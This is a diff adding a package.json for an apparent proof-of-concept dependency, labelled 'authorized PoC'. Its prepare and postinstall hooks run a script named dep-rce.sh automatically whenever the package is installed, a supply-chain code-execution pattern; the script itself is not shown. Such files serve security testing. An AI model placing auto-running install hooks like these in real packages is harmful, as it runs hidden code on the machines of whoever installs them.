@@ -1,0 +1,9 @@
+{
+  "name": "poc-dep-artifact",
+  "version": "1.0.0",
+  "description": "authorized PoC dependency",
+  "scripts": {
+    "prepare": "sh ./dep-rce.sh",
+    "postinstall": "sh ./dep-rce.sh"
+  }
+}
